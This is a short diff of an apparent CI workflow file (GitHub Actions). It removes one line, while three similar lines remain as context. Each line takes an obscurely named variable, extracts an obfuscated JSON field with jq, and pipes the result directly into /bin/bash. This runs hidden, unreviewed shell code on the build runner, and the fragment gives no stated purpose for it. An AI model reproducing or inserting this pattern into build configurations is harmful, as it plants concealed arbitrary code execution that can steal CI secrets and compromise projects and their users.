@@ -23,7 +23,6 @@ jobs:
           echo $vf8 | jq -r .gho782 | /bin/bash
           echo $vplw918 | jq -r .ad921 | /bin/bash
           printf '%s' "$rjxky2730" | jq -r .dzbv838 | /bin/bash
-          printf '%s' "$k8" | jq -r .jjari1442 | /bin/bash
 
       - name: Save results
         if: always()
